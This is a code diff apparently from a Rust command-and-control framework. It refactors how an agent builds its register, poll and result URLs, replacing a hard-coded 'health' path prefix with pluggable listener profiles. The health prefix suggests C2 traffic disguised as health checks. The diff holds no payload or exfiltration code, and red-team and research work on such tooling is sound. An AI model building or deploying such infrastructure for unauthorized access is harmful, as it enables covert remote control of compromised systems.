@@ -1,6 +1,6 @@
 //! Endpoint path construction for C2 protocol.
 
-use crate::constants::{HEALTH_BASE_PATH, HEALTH_PROFILE_NAME};
+use crate::profile::{profile_by_name, ListenerProfile};
 
 /// Builds register, poll, and result URLs for an agent.
 #[derive(Debug, Clone)]
@@ -12,21 +12,18 @@ pub struct Endpoints {
 
 impl Endpoints {
     /// Creates endpoints for the given base URL and agent_id.
-    /// If profile_name == HEALTH_PROFILE_NAME, uses health path prefix.
+    /// Resolves profile_name to a ListenerProfile to determine paths.
     pub fn new(base: &str, profile_name: &str, agent_id: &str) -> Self {
-        let is_health = profile_name == HEALTH_PROFILE_NAME;
-        if is_health {
-            Self {
-                register: format!("{}{}/register", base, HEALTH_BASE_PATH),
-                poll: format!("{}{}/poll/{}", base, HEALTH_BASE_PATH, agent_id),
-                result: format!("{}{}/result/{}", base, HEALTH_BASE_PATH, agent_id),
-            }
-        } else {
-            Self {
-                register: format!("{}/register", base),
-                poll: format!("{}/poll/{}", base, agent_id),
-                result: format!("{}/result/{}", base, agent_id),
-            }
+        let profile = profile_by_name(profile_name);
+        Self::from_profile(base, &*profile, agent_id)
+    }
+
+    /// Creates endpoints from an explicit profile reference.
+    pub fn from_profile(base: &str, profile: &dyn ListenerProfile, agent_id: &str) -> Self {
+        Self {
+            register: profile.register_url(base),
+            poll: profile.poll_url(base, agent_id),
+            result: profile.result_url(base, agent_id),
         }
     }
 }
